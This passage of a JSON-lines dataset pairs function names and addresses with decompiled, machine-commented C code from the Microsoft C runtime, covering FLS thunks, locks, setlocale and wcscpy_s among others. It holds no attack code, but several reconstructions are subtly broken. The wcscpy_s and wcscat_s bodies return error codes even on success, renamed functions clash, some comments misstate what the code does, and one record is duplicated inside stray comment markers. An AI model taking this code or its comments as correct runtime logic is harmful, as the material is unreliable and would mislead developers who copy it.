(HMODULE)0x0) {\n                    wchar_t *lpLibFileName = (wchar_t *)(&PTR_u_api_ms_win_core_fibers_l1_1_1_140025e88)[mVar2];\n                    hLibModule = LoadLibraryExW(lpLibFileName, (HANDLE)0x0, 0x800); // Load the library with specific flags\n                    \n                    // Check if loading the library failed\n                    if (hLibModule == (HMODULE)0x0) {\n                        DVar4 = GetLastError(); // Get the last error code\n                        // If the error code indicates a specific failure, try loading without flags\n                        if (((DVar4 == 0x57) && (wcsncmp(lpLibFileName, L\"api-ms-\", 7) != 0) &&\n                             (wcsncmp(lpLibFileName, L\"ext-ms-\", 7) != 0))) {\n                            hLibModule = LoadLibraryExW(lpLibFileName, (HANDLE)0x0, 0); // Attempt to load without flags\n                        }\n                    }\n                    \n                    // If the library was successfully loaded\n                    if (hLibModule != (HMODULE)0x0) {\n                        LOCK(); // Acquire lock for thread safety\n                        (&DAT_140039cf8)[mVar2] = hLibModule; // Store the loaded module handle\n                        UNLOCK(); // Release lock\n                        goto LAB_14000e5ee; // Jump to function retrieval section\n                    }\n                    \n                    // If loading failed, mark the module as invalid\n                    LOCK();\n                    (&DAT_140039cf8)[mVar2] = 0xffffffffffffffff; // Set to invalid value\n                    UNLOCK();\n                }\n                param_3++; // Move to the next module ID\n            } while (param_3 != param_4); // Continue until all modules are checked\n        }\n        hLibModule = (HMODULE)0x0; // Reset the library handle if no valid module was found\n    LAB_14000e5ee:\n        // If a valid library module is found, attempt to get the function address\n        if ((hLibModule != (HMODULE)0x0) &&\n            (pFVar6 = GetProcAddress(hLibModule, param_2), pFVar6 != (FARPROC)0x0)) {\n            bVar3 = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f; // Calculate rotation value\n            LOCK(); // Acquire lock for thread safety\n            (&DAT_140039d10)[param_1] =\n                ((ulonglong)pFVar6 >> bVar3 | (longlong)pFVar6 << 0x40 - bVar3) ^ DAT_140038080; // Store the function pointer\n            UNLOCK(); // Release lock\n            return pFVar6; // Return the function pointer\n        }\n    }\n    // If no valid function pointer was found, mark it as invalid\n    bVar3 = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f; // Calculate rotation value\n    LOCK(); // Acquire lock for thread safety\n    (&DAT_140039d10)[param_1] = (0xffffffffffffffffU >> bVar3 | -1L << 0x40 - bVar3) ^ DAT_140038080; // Set to invalid value\n    UNLOCK(); // Release lock\n    return (void *)0x0; // Return null pointer\n}\n"}
{"Function Name": "__vcrt_FlsAlloc", "Address": "14000e694", "Source Code": "\nvoid __vcrt_FlsAlloc(undefined8 input_param)\n{\n    // Attempt to retrieve the function pointer for \"FlsAlloc\"\n    void *function_pointer = try_get_function(0, \"FlsAlloc\", (module_id *)&module_id_1, (module_id *)&module_id_2);\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer != (void *)0x0) {\n        // Call the function using the retrieved pointer with the provided parameter\n        (*(code *)guard_dispatch_function)(input_param);\n        return; // Exit the function if the call was successful\n    }\n    \n    // If the function pointer was not retrieved, call TlsAlloc as a fallback\n    TlsAlloc();\n}\n"}
{"Function Name": "__vcrt_FlsFree", "Address": "14000e6dc", "Source Code": "\nvoid __vcrt_FlsFree(undefined4 tls_parameter)\n{\n    // Attempt to retrieve the function pointer for \"FlsFree\"\n    void *function_pointer = try_get_function(1, \"FlsFree\", (module_id *)&module_id_start, (module_id *)&module_id_end);\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer != (void *)0x0) {\n        // Call the function using the retrieved pointer\n        (*(code *)guard_dispatch_function)();\n        return; // Exit the function if the call was made\n    }\n    \n    // If the function pointer was not retrieved, call TlsFree with the provided parameter\n    TlsFree(tls_parameter);\n}\n"}
{"Function Name": "__vcrt_FlsGetValue", "Address": "14000e724", "Source Code": "\nvoid __vcrt_FlsGetValue(undefined4 module_param)\n{\n    // Attempt to retrieve the function pointer for \"FlsGetValue\"\n    void *function_pointer = try_get_function(2, \"FlsGetValue\", (module_id *)&DAT_140025f68, (module_id *)&DAT_140025f70);\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer != (void *)0x0) {\n        // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n        (*(code *)guard_dispatch_function)();\n        return; // Exit the function if the call was successful\n    }\n    \n    // If the function pointer was not retrieved, call TlsGetValue with the provided parameter\n    TlsGetValue(module_param);\n}\n"}
{"Function Name": "__vcrt_FlsSetValue", "Address": "14000e76c", "Source Code": "\nvoid __vcrt_FlsSetValue(DWORD thread_local_storage_index, LPVOID value)\n{\n    // Attempt to retrieve the function pointer for FlsSetValue\n    void *function_pointer = try_get_function(3, \"FlsSetValue\", (module_id *)&DAT_140025f70, (module_id *)&DAT_140025f78);\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (void *)0x0) {\n        // If not, call TlsSetValue with the provided parameters\n        TlsSetValue(thread_local_storage_index, value);\n    } else {\n        // If the function pointer is valid, call the function using the pointer\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n    }\n}\n"}
{"Function Name": "__vcrt_InitializeCriticalSectionEx", "Address": "14000e7c0", "Source Code": "\nvoid __vcrt_InitializeCriticalSectionEx(LPCRITICAL_SECTION critical_section, DWORD spin_count, undefined4 undefined_param)\n{\n    // Attempt to retrieve the address of the \"InitializeCriticalSectionEx\" function\n    void *function_address = try_get_function(4, \"InitializeCriticalSectionEx\", (module_id *)&DAT_140025f78, (module_id *)&PTR_s___based__140025f80);\n    \n    // Check if the function was successfully retrieved\n    if (function_address == (void *)0x0) {\n        // If not, call InitializeCriticalSectionAndSpinCount with the provided parameters\n        InitializeCriticalSectionAndSpinCount(critical_section, spin_count);\n    } else {\n        // If the function was retrieved, call it with the provided parameters\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(critical_section, spin_count, undefined_param);\n    }\n}\n"}
{"Function Name": "__vcrt_initialize_winapi_thunks", "Address": "14000e824", "Source Code": "\nvoid __vcrt_initialize_winapi_thunks(void)\n{\n    undefined8 initialValue = DAT_140038080; // Initialize uVar1 with the value from DAT_140038080\n    undefined8 *pointerToData = &DAT_140039d10; // Set puVar3 to point to the address of DAT_140039d10\n    for (longlong loopCounter = 5; loopCounter != 0; loopCounter--) { // Loop 5 times\n        *pointerToData++ = initialValue; // Assign the value of uVar1 to the current location pointed by puVar3, then increment puVar3\n    }\n}\n"}
{"Function Name": "__vcrt_uninitialize_winapi_thunks", "Address": "14000e854", "Source Code": "\nvoid __vcrt_uninitialize_winapi_thunks(char isUninitialize)\n{\n    undefined8 *libraryModulePtr = &DAT_140039cf8; // Pointer to the start of the library module array\n    if (isUninitialize == '\\0') { // Check if the parameter is zero\n        do {\n            HMODULE currentLibModule = (HMODULE)*libraryModulePtr; // Retrieve the current library module\n            if (currentLibModule && currentLibModule != (HMODULE)0xffffffffffffffff) { // Check if the module is valid\n                FreeLibrary(currentLibModule); // Free the loaded library\n            }\n            *libraryModulePtr++ = 0; // Set the current pointer to zero (clear the entry)\n        } while (libraryModulePtr != &DAT_140039d10); // Continue until the end of the array is reached\n    }\n}\n"}
{"Function Name": "_NLG_Notify", "Address": "14000e8b0", "Source Code": "\nvoid notifyFunction(void) // Function definition for _NLG_Notify\n{\n    anotherFunction(); // Call to another function FUN_14000e8d0\n}\n"}
{"Function Name": "__except_validate_context_record", "Address": "14000e8e4", "Source Code": "\nvoid __except_validate_context_record(longlong context_record)\n{\n    // Check if the pointer to the guard check function is not equal to the current guard check function\n    if ((code *)guard_check_function_pointer != current_guard_check_function) {\n        // Validate if the value at offset 0x98 of param_1 is outside the range defined by Self\n        if (*(ulonglong *)(context_record + 0x98) < *(ulonglong *)((longlong)self_reference + 0x10) ||\n            *(ulonglong *)((longlong)self_reference + 8) < *(ulonglong *)(context_record + 0x98)) {\n            // Call the SWI instruction with code 0x29 and argument 0xd if the value is out of range\n            ((code *)swi_instruction(0x29))(0xd);\n        }\n    }\n}\n"}
{"Function Name": "_CallSettingFrame", "Address": "14000e930", "Source Code": "\nvoid _CallSettingFrame(void)\n{\n    // Declare a function pointer 'pcVar1' and assign it the address returned by _NLG_Notify()\n    code *functionPointer = (code *)notifyFunction();\n    \n    // Call the function pointed to by 'pcVar1'\n    (*functionPointer)();\n    \n    // Call the function FUN_14000e8e0()\n    anotherFunction();\n}\n"}
{"Function Name": "_CallSettingFrameEncoded", "Address": "14000e980", "Source Code": "\nvoid _CallSettingFrameEncoded(undefined8 setting_param_1, undefined8 setting_param_2, undefined8 setting_param_3)\n{\n    // Retrieve the address of the _NLG_Notify function and cast it to a function pointer\n    code *notify_function_pointer = (code *)_NLG_Notify();\n    \n    // Call the function pointed to by pcVar1 with param_3 as an argument\n    (*notify_function_pointer)(setting_param_3);\n    \n    // Call the FUN_14000e8e0 function\n    FUN_14000e8e0();\n}\n"}
{"Function Name": "wcscpy_s", "Address": "14000e9c8", "Source Code": "\nerrno_t __cdecl wcscpy_s(wchar_t *destination, rsize_t sizeInWords, wchar_t *source)\n{\n    wchar_t *destPtr; // Pointer to traverse the destination string\n    // Check if destination pointer is not null and size is not zero\n    if ((destination != (wchar_t *)0x0) && (sizeInWords != 0)) {\n        // Check if source pointer is not null\n        if (source != (wchar_t *)0x0) {\n            destPtr = destination; // Initialize pointer to the start of the destination\n            do {\n                *destPtr = *source; // Copy character from source to destination\n                if (*source == L'\\0') break; // Break if null terminator is reached\n                destPtr++; // Move to the next character in destination\n                source++; // Move to the next character in source\n                sizeInWords--; // Decrement the remaining size\n            } while (sizeInWords != 0); // Continue until size is zero\n            \n            // Check if there is still space left in the destination\n            if (sizeInWords != 0) {\n                *destination = L'\\0'; // Null-terminate the destination string\n                *__doserrno() = 0x22; // Set error code for insufficient space\n                return 0x22; // Return error code\n            }\n            *destination = L'\\0'; // Null-terminate the destination string\n        }\n    }\n    *destination = L'\\0'; // Null-terminate the destination string in case of error\n    *__doserrno() = 0x16; // Set error code for null pointer or zero size\n    return 0x16; // Return error code\n}\n"}
{"Function Name": "wcscat_s", "Address": "14000ea30", "Source Code": "\nerrno_t __cdecl wcscat_s(wchar_t *destination, rsize_t size_in_words, wchar_t *source)\n{\n    wchar_t *dest_ptr = destination; // Pointer to traverse the destination string\n    if ((destination != (wchar_t *)0x0) && (size_in_words != 0)) { // Check if destination is not null and size is non-zero\n        if (source == (wchar_t *)0x0) { // Check if source is null\n            *destination = L'\\0'; // Set destination to empty string if source is null\n        } else {\n            // Traverse to the end of the destination string\n            while (size_in_words != 0 && *dest_ptr != L'\\0') {\n                dest_ptr++; // Move pointer to next character in destination\n                size_in_words--; // Decrement remaining size\n            }\n            if (size_in_words != 0) { // Check if there is space left in destination\n                // Append source string to destination\n                while (size_in_words != 0) {\n                    *dest_ptr = *source; // Copy character from source to destination\n                    if (*source == L'\\0') break; // Stop if end of source string is reached\n                    dest_ptr++; // Move pointer to next character in destination\n                    source++; // Move pointer to next character in source\n                    size_in_words--; // Decrement remaining size\n                }\n                if (size_in_words == 0) { // Check if destination buffer is full\n                    *destination = L'\\0'; // Null-terminate destination string\n                    __doserrno()[0] = 0x22; // Set error code for buffer overflow\n                    FUN_14000ecf8(); // Call error handling function\n                    return 0x22; // Return error code\n                }\n            }\n            *destination = L'\\0'; // Null-terminate destination string\n        }\n    }\n    __doserrno()[0] = 0x16; // Set error code for null destination or zero size\n    FUN_14000ecf8(); // Call error handling function\n    return 0x16; // Return error code\n}\n"}
{"Function Name": "terminate", "Address": "14000eab0", "Source Code": "\nvoid terminate(void)\n{\n    // Check if the value at the specified offset in the thread-local storage is not zero\n    if (*(longlong *)(get_thread_local_storage() + 0x18) != 0) {\n        // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n        (*(code *)guard_dispatch_function)();\n    }\n    // Terminate the program by calling abort()\n    abort();\n}\n"}
{"Function Name": "FUN_14000ead0", "Address": "14000ead0", "Source Code": "\nvoid FUN_14000ead0(LPVOID memory_pointer) // Function definition with a parameter of type LPVOID\n{\n    _free_base(memory_pointer); // Call to _free_base function to free the memory pointed to by param_1\n}\n"}
{"Function Name": "__acrt_call_reportfault", "Address": "14000eae4", "Source Code": "\nvoid __acrt_call_reportfault(int errorCode, DWORD exceptionCode, DWORD exceptionFlags)\n{\n    LONG longValue; // Variable to store a long integer value\n    PRUNTIME_FUNCTION runtimeFunctionEntry; // Pointer to a runtime function entry\n    _EXCEPTION_POINTERS exceptionPointers; // Structure to hold exception information\n    _CONTEXT threadContext; // Structure to hold the context of the thread\n\n    exceptionPointers.ExceptionRecord = &exceptionRecord; // Initialize ExceptionRecord pointer\n    exceptionPointers.ContextRecord = &threadContext; // Initialize ContextRecord pointer\n\n    if (errorCode != -1) { // Check if param_1 is not -1\n        FUN_14000b694(); // Call a function if param_1 is valid\n    }\n\n    // Capture the exception context and store it in local_598\n    FUN_14000c740((undefined1 (*) [16])&exceptionRecord, 0, 0x98);\n    // Capture the thread context and store it in local_4f8\n    FUN_14000c740((undefined1 (*) [16])&threadContext, 0, 0x4d0);\n    \n    RtlCaptureContext(&threadContext); // Capture the current context of the thread\n\n    // Lookup the function entry for the current instruction pointer (RIP)\n    runtimeFunctionEntry = RtlLookupFunctionEntry(threadContext.Rip, &functionEntryBase, (PUNWIND_HISTORY_TABLE)0x0);\n    \n    if (runtimeFunctionEntry != (PRUNTIME_FUNCTION)0x0) { // Check if a valid function entry was found\n        // Perform a virtual unwind to restore the context\n        RtlVirtualUnwind(0, functionEntryBase, threadContext.Rip, runtimeFunctionEntry, &threadContext, NULL, NULL, (PKNONVOLATILE_CONTEXT_POINTERS)0x0);\n    }\n\n    threadContext.Rsp = (DWORD64)&stackPointerX; // Set the stack pointer to a specific address\n    exceptionRecord.ExceptionCode = exceptionCode; // Set the exception code\n    exceptionRecord.ExceptionFlags = exceptionFlags; // Set the exception flags\n\n    // Check if the exception filter returns 0, debugger is not present, and param_1 is valid\n    if ((UnhandledExceptionFilter(&exceptionPointers) == 0) && (IsDebuggerPresent() == 0) && (errorCode != -1)) {\n        FUN_14000b694(); // Call the function if conditions are met\n    }\n\n    __security_check_cookie(DAT_140038080 ^ (ulonglong)&stackPointerY); // Perform a security check on the cookie\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_14000ec40", "Address": "14000ec40", "Source Code": "\nvoid FUN_14000ec40(undefined8 input_value)\n{\n    // Assign the value of param_1 to the global variable _DAT_140039da0\n    global_variable = input_value;\n}\n"}
{"Function Name": "_invalid_parameter", "Address": "14000ec48", "Source Code": "\nvoid _invalid_parameter(wchar_t *input_param_1, wchar_t *input_param_2, wchar_t *input_param_3, uint input_param_4, uintptr_t input_param_5)\n{\n    // Retrieve the thread-local data pointer without exiting\n    ulonglong thread_local_data_ptr = __acrt_getptd_noexit();\n    \n    // Mask the DAT_140038080 value to get the lower 6 bits\n    byte masked_value = (byte)DAT_140038080 & 0x3f;\n    \n    // Check if the thread-local data pointer is null or if a specific value is zero\n    if ((thread_local_data_ptr == 0 || (*(longlong *)(thread_local_data_ptr + 0x3b8) == 0)) &&\n        // Check if the masked value of DAT_140038080 and _DAT_140039da0 is zero\n        ((DAT_140038080 ^ _DAT_140039da0) >> masked_value == 0 &&\n        // Check if the left-shifted masked value is also zero\n        (DAT_140038080 ^ _DAT_140039da0) << (0x40 - masked_value) == 0))) {\n        // Invoke the Watson error reporting function with the provided parameters\n        _invoke_watson(input_param_1, input_param_2, input_param_3, input_param_4, input_param_5);\n    }\n    \n    // Dispatch the call to the appropriate function with the provided parameters\n    (*(code *)PTR__guard_dispatch_icall_1400213e8)(input_param_1, input_param_2, input_param_3, input_param_4, input_param_5);\n}\n"}
{"Function Name": "FUN_14000ecf8", "Address": "14000ecf8", "Source Code": "\nvoid handleInvalidParameter(void) // Function definition\n{\n    // Call to _invalid_parameter function with all parameters set to null or zero\n    _invalid_parameter((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n}\n"}
{"Function Name": "FUN_14000ed18", "Address": "14000ed18", "Source Code": "\nvoid handleInvalidParameter(void) // Function definition\n{\n    checkInvalidParameter((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Call to handle invalid parameter\n    reportError((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Call to invoke Watson for error reporting\n}\n"}
{"Function Name": "_invoke_watson", "Address": "14000ed48", "Source Code": "\nvoid __cdecl\n_invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)\n{\n    BOOL BVar2; // Variable to store the result of processor feature check\n    HANDLE hProcess; // Handle for the current process\n\n    // Check if a specific processor feature (0x17) is present\n    BVar2 = IsProcessorFeaturePresent(0x17);\n    \n    // If the feature is present, invoke a system call with a specific code (5)\n    if (BVar2 != 0) {\n        ((code *)swi(0x29))(5);\n    }\n    \n    // Call a function to report a fault with specific parameters\n    __acrt_call_reportfault(2,0xc0000417,1);\n    \n    // Get the handle of the current process\n    hProcess = GetCurrentProcess();\n    \n    // Terminate the current process with a specific exit code (0xc0000417)\n    TerminateProcess(hProcess,0xc0000417);\n    \n    return; // Exit the function\n}\n"}
{"Function Name": "__acrt_initialize_locks", "Address": "14000ed90", "Source Code": "\nundefined8 __acrt_initialize_locks(void) // Function to initialize locks\n{\n    ulonglong lockCounter = 0; // Initialize loop counter\n    do {\n        // Initialize a critical section and store the result\n        undefined8 initializationResult = __acrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)(&DAT_140039db0 + lockCounter * 0x28), 4000, 0);\n        \n        // Check if the initialization was unsuccessful\n        if ((int)initializationResult == 0) {\n            // Uninitialize locks and return an error code\n            return __acrt_uninitialize_locks() & 0xffffffffffffff00;\n        }\n        \n        // Increment the lock counter\n        lockCounterTotal++;\n        lockCounter++; // Move to the next lock\n    } while (lockCounter < 0xe); // Continue until all locks are initialized\n    // Return success code with the last initialization result\n    return CONCAT71((int7)((ulonglong)initializationResult >> 8), 1);\n}\n"}
{"Function Name": "__acrt_lock", "Address": "14000edd8", "Source Code": "\nvoid __acrt_lock(int input_param)\n{\n    // Enter a critical section to ensure thread safety\n    // Calculate the address of the critical section based on the input parameter\n    // Multiply param_1 by 0x28 to get the correct offset from the base address DAT_140039db0\n    EnterCriticalSection((LPCRITICAL_SECTION)(&base_address + (longlong)input_param * 0x28));\n}\n"}
{"Function Name": "__acrt_uninitialize_locks", "Address": "14000edf4", "Source Code": "\nundefined8 __acrt_uninitialize_locks(void)\n{\n    // Declare a variable to hold the current count of critical sections\n    ulonglong criticalSectionCount = (ulonglong)totalCriticalSections;\n\n    // Loop until all critical sections have been deleted\n    while ((int)criticalSectionCount != 0) {\n        // Decrement the counter\n        criticalSectionCount--;\n\n        // Delete the critical section at the calculated address\n        DeleteCriticalSection((LPCRITICAL_SECTION)(&criticalSectionArray + criticalSectionCount * 0x28));\n\n        // Decrement the total count of critical sections\n        totalCriticalSections--;\n    }\n\n    // Return success indicator\n    return 1;\n}\n"}
{"Function Name": "__acrt_unlock", "Address": "14000ee2c", "Source Code": "\nvoid __acrt_unlock(int critical_section_index)\n{\n    // Calculate the address of the critical section based on the input parameter\n    // and the base address DAT_140039db0, scaling by 0x28 (size of each critical section).\n    exit_critical_section((LPCRITICAL_SECTION)(&critical_section_base + (longlong)critical_section_index * 0x28));\n}\n"}
{"Function Name": "_lock_locales", "Address": "14000ee48", "Source Code": "\nvoid lockLocales(void)\n{\n    // Load locale APIs eagerly to ensure they are ready for use\n    eagerlyLoadLocaleAPIs();\n    \n    // Enter a critical section to protect shared resources\n    enterCriticalSection((CriticalSectionPointer)&criticalSectionData);\n}\n"}
{"Function Name": "FUN_14000ee64", "Address": "14000ee64", "Source Code": "\nvoid leaveCriticalSection(void)\n{\n    // Leave the critical section associated with the specified critical section object\n    LeaveCriticalSection((LPCRITICAL_SECTION)&criticalSectionObject);\n}\n"}
{"Function Name": "_malloc_base", "Address": "14000ee74", "Source Code": "\nLPVOID _malloc_base(ulonglong requested_size)\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory address\n    if (requested_size < 0xffffffffffffffe1) { // Check if the requested size is within valid range\n        if (requested_size == 0) { // If the requested size is zero\n            requested_size = 1; // Set the size to 1 to allocate at least one byte\n        }\n        do {\n            allocated_memory = HeapAlloc(heap_handle, 0, requested_size); // Attempt to allocate memory from the heap\n            if (allocated_memory != (LPVOID)0x0) { // Check if the allocation was successful\n                return allocated_memory; // Return the allocated memory pointer\n            }\n        } while (allocation_retry_condition() != 0 && custom_memory_handler(requested_size) != 0); // Retry allocation if conditions are met\n    }\n    *error_code() = 0xc; // Set the error code to indicate allocation failure\n    return (LPVOID)0x0; // Return null pointer to indicate failure\n}\n"}
{"Function Name": "operator()<>", "Address": "14000ee7c", "Source Code": "\\*\nwchar_t * operator()<>(undefined8 input_value, int *lock_resource, undefined8 *input_data, int *unlock_resource)\n{\n    wchar_t *result_pointer; // Declare a pointer to wide character\n    __acrt_lock(*lock_resource); // Lock the resource identified by the value pointed to by param_2\n    result_pointer = FID_conflict_operator__(input_data); // Call FID_conflict_operator__ with param_3 and store the result in pwVar1\n    __acrt_unlock(*unlock_resource); // Unlock the resource identified by the value pointed to by param_4\n    return result_pointer; // Return the pointer to wide character\n}\n*\\ \n \n\nwchar_t * operator()<>(undefined8 input_value, int *lock_resource, undefined8 *input_data, int *unlock_resource)\n{\n    wchar_t *result_pointer;\n    __acrt_lock(*lock_resource);\n    result_pointer = FID_conflict_operator__(input_data);\n    __acrt_unlock(*unlock_resource);\n    return result_pointer;\n}\n"}
{"Function Name": "FID_conflict:operator()", "Address": "14000eebc", "Source Code": "\nwchar_t * FID_conflict_operator__(undefined8 *param_1)\n{\n    char *source_buffer = *(char **)param_1[1]; // Retrieve source buffer from parameter\n    int locale_category_index = *(int *)*param_1; // Get the locale category index from parameter\n    wchar_t *wide_character_source; // Declare a wide character source variable\n\n    if (source_buffer == (char *)0x0) { // Check if source buffer is null\n        wide_character_source = _wsetlocale(locale_category_index, (wchar_t *)0x0); // Set locale using the category index\n    } else {\n        size_t converted_wide_string_size; // Variable to hold the size of the converted wide string\n        errno_t conversion_status = mbstowcs_s(&converted_wide_string_size, (wchar_t *)0x0, 0, source_buffer, 0x7fffffff); // Convert multibyte to wide character string\n        if ((conversion_status == 0x16) || (conversion_status == 0x22)) { // Check for specific error codes\n            _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke Watson for error handling\n        }\n        wchar_t *allocated_wide_string = (wchar_t *)_calloc_base(converted_wide_string_size, 2); // Allocate memory for the wide string\n        if (allocated_wide_string == (wchar_t *)0x0) goto LAB_14000ef3e; // Check for allocation failure\n        conversion_status = mbstowcs_s((size_t *)0x0, allocated_wide_string, converted_wide_string_size, source_buffer, 0xffffffffffffffff); // Convert multibyte string to wide character string\n        if (conversion_status != 0) { // Check for conversion errors\n            if ((conversion_status == 0x16) || (conversion_status == 0x22)) { // Check for specific error codes\n                _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke Watson for error handling\n            }\n            goto LAB_14000ef3e; // Go to error handling if conversion fails\n        }\n        wide_character_source = _wsetlocale(locale_category_index, allocated_wide_string); // Set locale with the converted wide string\n        _free_base(allocated_wide_string); // Free the allocated memory for the wide string\n    }\n\n    if (wide_character_source == (wchar_t *)0x0) { // Check if the locale setting failed\n        return (wchar_t *)0x0; // Return null if setting locale failed\n    }\n\n    localeinfo_struct locale_info; // Declare a structure to hold locale information\n    longlong thread_local_data_pointer = __acrt_getptd(); // Get the thread-local data pointer\n    locale_info.locinfo = *(pthreadlocinfo *)(thread_local_data_pointer + 0x90); // Retrieve locale info from thread-local data\n    locale_info.mbcinfo = *(pthreadmbcinfo *)(thread_local_data_pointer + 0x88); // Retrieve multibyte info from thread-local data\n    size_t converted_multibyte_string_size = 0; // Initialize variable to hold the size of the converted multibyte string\n    conversion_status = _wcstombs_s_l(&converted_multibyte_string_size, (char *)0x0, 0, wide_character_source, 0, &locale_info); // Convert wide character string to multibyte string\n    \n    if (conversion_status == 0) { // Check if conversion was successful\n        wchar_t *allocated_multibyte_string = (wchar_t *)_malloc_base(converted_multibyte_string_size + 4); // Allocate memory for the multibyte string\n        if (allocated_multibyte_string == (wchar_t *)0x0) { // Check for allocation failure\n            return (wchar_t *)0x0; // Return null if allocation failed\n        }\n        wchar_t *allocated_wide_string = allocated_multibyte_string + 2; // Set pointer to the allocated memory with an offset\n        conversion_status = _wcstombs_s_l((size_t *)0x0, (char *)allocated_wide_string, converted_multibyte_string_size, wide_character_source, 0xffffffffffffffff, &locale_info); // Convert wide string to multibyte string\n        if (conversion_status == 0) { // Check if conversion was successful\n            int *locale_reference_count = (int *)(locale_info.locinfo)->lc_category[(longlong)*(int *)*param_1 + 1].locale; // Get the locale reference count\n            if (locale_reference_count != (int *)0x0) { // Check if locale reference is valid\n                LOCK(); // Acquire lock for thread safety\n                int locale_category_index = *locale_reference_count; // Get the current reference count\n                *locale_reference_count = *locale_reference_count + -1; // Decrement the reference count\n                UNLOCK(); // Release lock\n                if (locale_category_index == 1) { // Check if reference count reached zero\n                    _free_base((locale_info.locinfo)->lc_category[(longlong)*(int *)*param_1 + 1].locale); // Free the locale memory\n                    locale_info.locinfo->lc_category[(longlong)*(int *)*param_1 + 1].locale = (char *)0x0; // Set locale pointer to null\n                }\n            }\n            if (((*(byte *)(thread_local_data_pointer + 0x3a8) & 2) == 0) && (((byte)DAT_1400381a4 & 1) == 0) && (locale_reference_count = (int *)locale_info.locinfo->lc_category[(longlong)*(int *)*param_1 + 1].locale, locale_reference_count != (int *)0x0)) {\n                LOCK(); // Acquire lock for thread safety\n                int locale_category_index = *locale_reference_count; // Get the current reference count\n                *locale_reference_count = *locale_reference_count + -1; // Decrement the reference count\n                UNLOCK(); // Release lock\n                if (locale_category_index == 1) { // Check if reference count reached zero\n                    _free_base(locale_info.locinfo->lc_category[(longlong)*(int *)*param_1 + 1].locale); // Free the locale memory\n                    locale_info.locinfo->lc_category[(longlong)*(int *)*param_1 + 1].locale = (char *)0x0; // Set locale pointer to null\n                }\n            }\n            *(undefined4 *)allocated_multibyte_string = *(undefined4 *)&locale_info.locinfo->lc_category[0].locale; // Copy locale information to allocated memory\n            locale_info.locinfo->lc_category[(longlong)*(int *)*param_1 + 1].locale = (char *)allocated_multibyte_string; // Set new locale pointer\n            locale_info.locinfo->lc_category[*(int *)*param_1].refcount = (int *)allocated_wide_string; // Set reference count for the new locale\n            return allocated_wide_string; // Return the pointer to the new multibyte string\n        }\n    }\n    \n    if ((conversion_status != 0x16) && (conversion_status != 0x22)) { // Check for specific error codes\n        LAB_14000ef3e: // Error handling label\n        _free_base(allocated_multibyte_string); // Free allocated memory on error\n        return (wchar_t *)0x0; // Return null on error\n    }\n}\n"}
{"Function Name": "setlocale", "Address": "14000f15c", "Source Code": "\nchar * __cdecl setlocale(int category, char *locale) // Function definition for setlocale\n{\n    wchar_t *wideCharPtr; // Pointer to wide character string\n    int resultArray1[2] = {4, 0}; // Local array for results, initialized with specific values\n    int *categoryPtr = &category; // Pointer to the category variable\n    char **localePtr = &locale; // Pointer to the locale variable\n    int resultArray2[2] = {4, 0}; // Another local array for results, initialized similarly\n    \n    __acrt_eagerly_load_locale_apis(); // Call to load locale APIs eagerly\n    wideCharPtr = operator()<>(local_res18, resultArray2, &categoryPtr, resultArray1); // Call to operator function with parameters\n    return (char *)wideCharPtr; // Return the wide character string cast to char pointer\n}\n"}
{"Function Name": "__pctype_func", "Address": "14000f1a8", "Source Code": "\n__pctype_func(void) // Function declaration for __pctype_func\n{\n    longlong threadLocalDataPointer = __acrt_getptd(); // Retrieve the thread-local data pointer\n    undefined8 *specificDataMember = *(undefined8 **)(threadLocalDataPointer + 0x90); // Access a specific data member from the thread-local data\n    FUN_140016988(threadLocalDataPointer, (longlong *)&specificDataMember); // Call a function with the thread-local data pointer and the address of local_res8\n    return (ushort *)*specificDataMember; // Return the value pointed to by local_res8, cast to a ushort pointer\n}\n"}
{"Function Name": "_LocaleUpdate::_LocaleUpdate", "Address": "14000f1d8", "Source Code": "\\*\n_LocaleUpdate * __thiscall\n_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this, __crt_locale_pointers *param_1)\n{\n    // Pointer to the location 8 bytes after the current object\n    _LocaleUpdate *p_Var1 = this + 8;\n\n    // Check if the provided locale pointers parameter is null\n    if (param_1 == (__crt_locale_pointers *)0x0) {\n        longlong lVar3;\n\n        // Initialize the locale update status to 0 (no update)\n        this[0x18] = (_LocaleUpdate)0x0;\n\n        // Check if a certain global variable is not zero\n        if (DAT_14003a284 != 0) {\n            // Get the pointer to the thread data\n            lVar3 = __acrt_getptd();\n\n            // Store the thread data pointer in the current object\n            *(longlong *)this = lVar3;\n\n            // Copy the multibyte information from thread data to the current object\n            *(longlong *)p_Var1 = *(longlong *)(lVar3 + 0x90);\n            *(undefined8 *)(this + 0x10) = *(undefined8 *)(lVar3 + 0x88);\n\n            // Call a function to update locale information\n            FUN_140016988(lVar3, (longlong *)p_Var1);\n\n            // Update multibyte information based on the current locale\n            __acrt_update_multibyte_info(*(longlong *)this, (longlong *)(this + 0x10));\n\n            // Retrieve a specific flag from the thread data\n            uint uVar2 = *(uint *)(*(longlong *)this + 0x3a8);\n\n            // Check if the second bit of the flag is set\n            if ((uVar2 & 2) != 0) {\n                return this; // Return early if the flag is already set\n            }\n\n            // Set the second bit of the flag\n            *(uint *)(*(longlong *)this + 0x3a8) = uVar2 | 2;\n\n            // Update the locale update status to indicate an update occurred\n            this[0x18] = (_LocaleUpdate)0x1;\n\n            return this; // Return the updated object\n        }\n    } else {\n        // Copy the locale pointers from the provided parameter to the current object\n        *(undefined4 *)p_Var1 = 